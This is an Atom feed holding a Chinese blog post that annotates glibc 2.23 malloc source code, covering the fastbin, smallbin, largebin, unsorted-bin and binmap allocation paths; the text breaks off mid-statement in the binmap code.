<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ixout&#39;s blog</title>
  
  
  <link href="https://ixout.github.io/atom.xml" rel="self"/>
  
  <link href="https://ixout.github.io/"/>
  <updated>2023-07-30T11:42:59.509Z</updated>
  <id>https://ixout.github.io/</id>
  
  <author>
    <name>ixout</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>malloc-free实现变化</title>
    <link href="https://ixout.github.io/posts/61238/"/>
    <id>https://ixout.github.io/posts/61238/</id>
    <published>2023-07-30T03:26:13.000Z</published>
    <updated>2023-07-30T11:42:59.509Z</updated>
    
    <content type="html"><![CDATA[<span class='p '>第二篇</span><h1 id="glibc2-23"><a href="#glibc2-23" class="headerlink" title="glibc2.23"></a>glibc2.23</h1><p>还是先以2.23为基础</p><h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><p>大多写在注释,重要的另写</p><h3 id="fastbin-FILO"><a href="#fastbin-FILO" class="headerlink" title="fastbin(FILO)"></a>fastbin(FILO)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = fastbin_index (nb); <span class="comment">//计算出索引</span></span><br><span class="line">    mfastbinptr *fb = &amp;fastbin (av, idx);<span class="comment">//获得单链表头节点</span></span><br><span class="line">    mchunkptr pp = *fb;<span class="comment">//获得第一个chunk</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        victim = pp;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">           != victim);</span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))<span class="comment">//检查</span></span><br><span class="line">          &#123;</span><br><span class="line">            errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">          errout:</span><br><span class="line">            malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        check_remalloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem (victim);<span class="comment">//chunk2mem转换地址</span></span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;<span class="comment">//返回</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="smallbin-FIFO"><a href="#smallbin-FIFO" class="headerlink" title="smallbin(FIFO)"></a>smallbin(FIFO)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">   &#123;</span><br><span class="line">     idx = smallbin_index (nb);<span class="comment">//计算索引</span></span><br><span class="line">     bin = bin_at (av, idx);<span class="comment">//初始化链表头</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> ((victim = last (bin)) != bin)<span class="comment">//检测链为空</span></span><br><span class="line">       &#123;</span><br><span class="line">         <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">           malloc_consolidate (av);</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">             bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">               &#123;</span><br><span class="line">                 errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                 <span class="keyword">goto</span> errout;</span><br><span class="line">               &#125;</span><br><span class="line">             set_inuse_bit_at_offset (victim, nb);<span class="comment">//设置下一个chunk的p位</span></span><br><span class="line">             bin-&gt;bk = bck;</span><br><span class="line">             bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">               victim-&gt;size |= NON_MAIN_ARENA;<span class="comment">//设置A位</span></span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             <span class="keyword">return</span> p;<span class="comment">//返回</span></span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="largebin-FIFO"><a href="#largebin-FIFO" class="headerlink" title="largebin(FIFO)"></a>largebin(FIFO)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以看到,申请largebin时,并不会直接进入largebin中寻找,而是会:</p><ol><li>判断是否有fastchunk,是则触发malloc_consolidate (av);</li><li>进入unsortedbin遍历循环,找到则返回</li><li>进入largebin分配</li></ol><h3 id="unsortedbin-FIFO-遍历"><a href="#unsortedbin-FIFO-遍历" class="headerlink" title="unsortedbin(FIFO)遍历"></a>unsortedbin(FIFO)遍历</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<span class="comment">//先尝试用last_remainer分配</span></span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);   <span class="comment">//刚好相等</span></span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;  <span class="comment">//放入smallbin</span></span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span><span class="comment">//放入largebin</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<span class="comment">//寻找位置并置nextsize链</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);<span class="comment">//标记binmap</span></span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)<span class="comment">//最多循环10000次</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="循环后largebin分配"><a href="#循环后largebin分配" class="headerlink" title="循环后largebin分配"></a>循环后largebin分配</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">     &#123;</span><br><span class="line">       bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">       <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">           (<span class="type">unsigned</span> <span class="type">long</span>) (victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb))<span class="comment">//最大的大于需要的才进入</span></span><br><span class="line">         &#123;</span><br><span class="line">           victim = victim-&gt;bk_nextsize;<span class="comment">//从小的开始找</span></span><br><span class="line">           <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                   (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">             victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">           <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">              list does not have to be rerouted.  */</span></span><br><span class="line">           <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">             victim = victim-&gt;fd;<span class="comment">//尽量不取出nextsize链上的chunk</span></span><br><span class="line"></span><br><span class="line">           remainder_size = size - nb;</span><br><span class="line">           unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">           <span class="comment">/* Exhaust */</span></span><br><span class="line">           <span class="keyword">if</span> (remainder_size &lt; MINSIZE)<span class="comment">//其实之前已经调整对齐了,这里基本就是刚好相等的情况</span></span><br><span class="line">             &#123;</span><br><span class="line">               set_inuse_bit_at_offset (victim, size);</span><br><span class="line">               <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                 victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">             &#125;</span><br><span class="line">           <span class="comment">/* Split */</span></span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">             &#123;</span><br><span class="line">               remainder = chunk_at_offset (victim, nb);</span><br><span class="line">               <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                  have to perform a complete insert here.  */</span></span><br><span class="line">               bck = unsorted_chunks (av);</span><br><span class="line">               fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                 &#123;</span><br><span class="line">                   errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">                   <span class="keyword">goto</span> errout;</span><br><span class="line">                 &#125;</span><br><span class="line">               remainder-&gt;bk = bck;</span><br><span class="line">               remainder-&gt;fd = fwd;</span><br><span class="line">               bck-&gt;fd = remainder;</span><br><span class="line">               fwd-&gt;bk = remainder;</span><br><span class="line">               <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                 &#123;</span><br><span class="line">                   remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                   remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">               set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                         (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));<span class="comment">//设置取出部分</span></span><br><span class="line">               set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">               set_foot (remainder, remainder_size);<span class="comment">//设置remainder</span></span><br><span class="line">             &#125;</span><br><span class="line">           check_malloced_chunk (av, victim, nb);</span><br><span class="line">           <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">           alloc_perturb (p, bytes);</span><br><span class="line">           <span class="keyword">return</span> p;<span class="comment">//返回</span></span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><h3 id="binmap情况"><a href="#binmap情况" class="headerlink" title="binmap情况"></a>binmap情况</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">   ++idx;</span><br><span class="line">   bin = bin_at (av, idx);</span><br><span class="line">   block = idx2block (idx);</span><br><span class="line">   <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">   bit = idx2bit (idx);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (;; )</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">       <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">         &#123;</span><br><span class="line">           <span class="keyword">do</span></span><br><span class="line">             &#123;</span><br><span class="line">               <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">                 <span class="keyword">goto</span> use_top;</span><br><span class="line">             &#125;</span><br><span class="line">           <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">           bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">           bit = <span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">       <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">         &#123;</span><br><span class="line">           bin = next_bin (bin);</span><br><span class="line">           bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">           assert (bit != <span class="number">0</span>);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">       victim = last (bin);</span><br><span class="line"></span><br><span class="line">       <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">       <span class="keyword">if</span> (victim == bin)</span><br><span class="line">         &#123;</span><br><span class="line">           av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">           bin = next_bin (bin);</span><br><span class="line">           bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line">           size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">           <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">           assert ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">           remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">           <span class="comment">/* unlink */</span></span><br><span class="line">           unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">           <span class="comment">/* Exhaust */</span></span><br><span class="line">           <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">             &#123;</span><br><span class="line">               set_inuse_bit_at_offset (victim, size);</span><br><span class="line">               <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                 victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">           <span class="comment">/* Split */</span></span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">             &#123;</span><br><span class="line">               remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">               <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                  have to perform a complete insert here.  */</span></span><br><span class="line">               bck = unsorted_chunks (av);</span><br><span class="line">               fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                 &#123;</span><br><span class="line">                   errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">                   <span class="keyword">goto</span> errout;</span><br><span class="line">                 &#125;</span><br><span class="line">               remainder-&gt;bk = bck;</span><br><span class="line">               remainder-&gt;fd = fwd;</span><br><span class="line">               bck-&gt;fd = 